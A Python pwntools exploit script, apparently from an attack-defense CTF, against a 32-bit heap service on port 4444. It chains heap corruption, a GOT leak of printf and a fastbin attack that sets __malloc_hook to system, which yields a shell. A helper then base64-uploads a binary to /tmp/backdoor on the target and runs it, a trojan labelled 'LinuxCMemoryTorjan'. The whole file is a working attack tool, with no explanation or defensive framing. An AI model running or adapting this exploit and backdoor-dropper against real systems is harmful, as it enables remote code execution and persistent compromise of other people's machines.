from pwn import *
import base64

debug = 0
slog = 0
local = 0
if slog: context.log_level = True

def run(sh, filename):
    data = open(filename, 'r').read()
    cmd = 'echo ' + base64.b64encode(data) + ' > /tmp/base64.txt;'
    cmd += 'base64 -d /tmp/base64.txt > /tmp/backdoor;'
    cmd += 'chmod +x /tmp/backdoor;'
    cmd += 'rm /tmp/base64.txt;'
    cmd += '/tmp/backdoor;echo FINISH'
    sh.sendline(cmd)
    sh.recvuntil('FINISH')

def pwn(ip, getshell = True):
    if local:
        p = process("./company")
        libc = ELF('/lib32/libc-2.24.so')
    else:
        p = remote(ip, 4444)
        libc = ELF('/lib32/libc-2.24.so')

    def create(name,phone,length,description):
        p.recvuntil(">>> ")
        p.sendline("1")
        p.recvuntil("Name: ")
        p.sendline(name)
        p.recvuntil("Enter Phone No: ")
        p.sendline(phone)
        p.recvuntil("Length of description: ")
        p.sendline(str(length))
        p.recvuntil("Enter description:", timeout = 0.5)
        p.sendline(description)

    def remove(name):
        p.recvuntil(">>> ")
        p.sendline("2")
        p.recvuntil("company's name to remove? ")
        p.sendline(name)

    def edit(name,op,content, shell = False):
        p.recvuntil(">>> ")
        p.sendline("3")
        p.recvuntil("Name to change? ")
        p.sendline(name)
        p.recvuntil(">>> ")
        p.sendline(str(op))
        if(op==1):
            p.sendline(content)
        else:
            p.recvuntil("Length of description: ")
            p.sendline(content[0])
            if shell:
                return
            p.recvuntil("Description:", timeout = 0.5)
            p.sendline(content[1])

    def display():
        p.recvuntil(">>> ")
        p.sendline("4")

    create('a', 'bbbb', 100, p32(0) + p32(0x11) + 'a'*8 + p32(0) + p32(0x11) + 'a'*8 + p32(0) + p32(0x11))


    fake_heap = p32(0) + p32(0x41) + 'a'*0x8 + p32(0) + p32(0x31) + 'a'*8 + p32(0) + p32(0x21) + 'a'*0x18 + p32(0) + p32(0x31)
    create('b', 'bbbb', 100, fake_heap)

    #alter company->phone and company->description
    printf_got = 0x804B010
    heap_got = 0x804b124
    edit('a', 1, 'a\x00'.ljust(0x100, 'a') + p32(0x64) + p32(1) + p32(printf_got) + p32(heap_got) + 'b\x00')

    #leak information
    display()
    p.recvuntil('Phone #: ')
    p.recvuntil('Phone #: ')
    heap_addr = u32(p.recv(4)) - 0x1428
    print 'heap addr is ', hex(heap_addr)
    p.recvuntil('Description: ')
    printf_addr = u32(p.recv(4))
    print 'printf addr is ', hex(printf_addr)

    system_addr = printf_addr - libc.symbols['printf'] + libc.symbols['system']
    print 'system addr is', hex(system_addr)

    bin_sh = printf_addr - libc.symbols['printf'] + libc.search('/bin/sh').next()

    malloc_hook = printf_addr - libc.symbols['printf'] + libc.symbols['__malloc_hook']
    fake_fastbin = malloc_hook + 0x2c

    #fastbin attack
    payload = 'a\x00'.ljust(0x100, 'a') + p32(0x64) + p32(1) + p32(heap_addr + 0x14c0) + p32(heap_addr + 0x1498) + 'b\x00'
    edit('a', 1, payload)
    remove('b')

    #create fake heap heap in main_arena
    payload = 'a\x00'.ljust(0x100, 'a') + p32(0x64) + p32(1) + p32(heap_addr + 0x14b0) + p32(heap_addr + 0x1498) + 'b\x00'
    edit('a', 1, payload)
    edit('b', 2, (str(0x38), 'a'*8 + p32(0) + p32(0x31) + p32(0x20)))
    edit('b', 2, (str(0x28), 'a'*8))

    payload = 'a\x00'.ljust(0x100, 'a') + p32(0x64) + p32(1) + p32(heap_addr + 0x14d0) + p32(heap_addr + 0x1498) + 'b\x00'
    edit('a', 1, payload)
    remove('b')

    #fastbin attack again
    create('c', 'a', 0x38, 'a'*8 + p32(0) + p32(0x31) + 'a'*8 + p32(0) + p32(0x21) + p32(fake_fastbin))

    payload = 'a\x00'.ljust(0x100, 'a') + p32(0x64) + p32(1) + p32(heap_addr + 0x1430) + p32(heap_addr + 0x1498) + 'b\x00'
    edit('a', 1, payload)

    edit('b', 2, (str(0x18), 'a'*8))

    #control main_arena->top
    print 'malloc_hook is', hex(malloc_hook)
    create('d', 'a', 0x18, 'a'*20 + p32(malloc_hook - 0x8))
    edit('a', 2, (str(0x70), p32(system_addr)))

    payload = 'a\x00'.ljust(0x100, 'a') + p32(0x64) + p32(1) + p32(heap_addr + 0x1440) + p32(heap_addr + 0x1498) + 'b\x00'
    edit('a', 1, payload)
    #gdb.attach(p, open('debug'))

    #call malloc('/bin/sh') which equals to system('/bin/sh')
    edit('b', 2, (str(bin_sh), p32(system_addr)), True)
    if getshell:
        p.interactive()
    else:
        run(p, "./LinuxCMemoryTorjan/main")

if __name__ == '__main__':
    pwn('127.0.0.1', getshell = False)
